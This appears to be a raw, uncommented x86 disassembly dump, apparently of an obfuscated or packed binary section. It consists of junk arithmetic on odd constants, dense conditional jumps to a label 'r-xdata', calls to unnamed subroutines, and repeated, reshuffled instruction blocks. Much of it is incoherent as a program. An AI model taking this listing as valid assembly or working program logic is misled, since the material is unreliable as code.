add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bc386
jae r-xdata
jl 0xffffffffa1a4d6c0
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_40446d
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40447a
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c15394
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7e7
push esi
call sub_4044ab
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18aca35
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c40
push eax
push ecx
sub esp 0x10
call sub_40445c
jo 0xffffffffff29d21d
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1cb
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20779
jg r-xdata
jge 0xffffffffc009ba4b
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe24b804
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
jae r-xdata
jpo 0x36289d72
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dc2
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_404460
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7e7
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85bc386
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1cb
jns r-xdata
add ebx 0x9c575756
call sub_40447a
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c15394
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c35417
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_4044ab
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4d6c0
jg r-xdata
jge 0x18aca35
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc009ba4b
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c40
push eax
push ecx
sub esp 0x10
call sub_40445c
jo 0xffffffffff29d21d
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x5975514e
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe24b804
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec186a4
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc648999
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20779
jge r-xdata
call sub_40446d
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
jae r-xdata
jpo 0x36289d72
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dc2
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40446d
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7e7
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1cb
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85bc386
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_4044ab
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_40447a
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c15394
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc009ba4b
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c40
push eax
push ecx
sub esp 0x10
call sub_40445c
jo 0xffffffffff29d21d
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x5975514e
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c35417
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe24b804
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4d6c0
jg r-xdata
jge 0x18aca35
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec186a4
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc648999
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_40446d
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20779
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
jae r-xdata
jpo 0x36289d72
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dc2
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40447a
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff8202bddc
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85bc386
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c15394
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_40445c
jo 0xffffffffff29d21d
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x5975514e
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_40447a
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_4044ab
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18aca35
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c40
jne r-xdata
jpe 0x18c35417
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec186a4
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4d6c0
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7e7
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20779
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1cb
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
jae r-xdata
jpo 0x36289d72
jg r-xdata
jge 0xffffffffc009ba4b
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dc2
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe24b804
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc648999
mov eax 0xff64870f
jge r-xdata
call sub_40446d
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_4044ab
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec1645a
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85bc386
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18aca35
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c15394
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1002c40
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_40445c
jo 0xffffffffff29d21d
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x5975514e
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_40447a
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add esi 0x99870f
push esi
call sub_4044ab
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20779
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c35417
call 0xffffffffcec186a4
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4d6c0
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7e7
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
jae r-xdata
jpo 0x36289d72
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dc2
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
